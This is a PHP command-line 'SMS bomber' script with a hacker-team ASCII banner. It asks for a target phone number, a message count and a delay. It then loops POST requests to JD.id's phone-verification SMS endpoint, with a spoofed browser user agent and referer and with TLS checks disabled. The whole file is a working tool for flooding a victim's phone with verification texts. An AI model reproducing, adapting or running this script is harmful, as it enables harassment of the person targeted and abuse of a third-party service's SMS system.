<?php

function jdidbom($no, $jum, $wait){

$x = 0; 

while($x < $jum) {

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL,"http://sc.jd.id/phone/sendPhoneSms");

curl_setopt($ch, CURLOPT_POST, 1);

curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&smsType=1");

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

curl_setopt($ch, CURLOPT_REFERER, 'http://sc.jd.id/phone/bindingPhone.html');

curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');

$server_output = curl_exec ($ch);

curl_close ($ch);

		echo $server_output."\n";

sleep($wait);

$x++;

flush();

}

}

echo "

######################################################################################

\e[91m GUBA CY\e[97mBER TEAM\e[32m
 _                                 _
| |__   __ _ _ __   __ _ ___  __ _| |_
| '_ \ / _` | '_ \ / _` / __|/ _` | __|
| |_) | (_| | | | | (_| \__ \ (_| | |_
|_.__/ \__,_|_| |_|\__, |___/\__,_|\__|
                   |___/

\e[91m Red {C} Coded By - Mr.P4TR!CK \e[32m

######################################################################################\n Mr.P4TR!CK :\e[1;31m";

echo "\e[0;36m Masukan nomor target\n Mr.P4TR!CK : ";

$nomor = trim(fgets(STDIN));

echo "\e[1;31m Mr.P4TR!CK : Jumlah pesan? \n\e[0;36m Mr.P4TR!CK : ";

$jumlah = trim(fgets(STDIN));

echo "\e[1;31m Mr.P4TR!CK : Tuliskan angka --> 0 \n\e[0;36m Mr.P4TR!CK : ";

$jeda = trim(fgets(STDIN));

$execute = jdidbom($nomor, $jumlah, $jeda);

print $execute;

?>

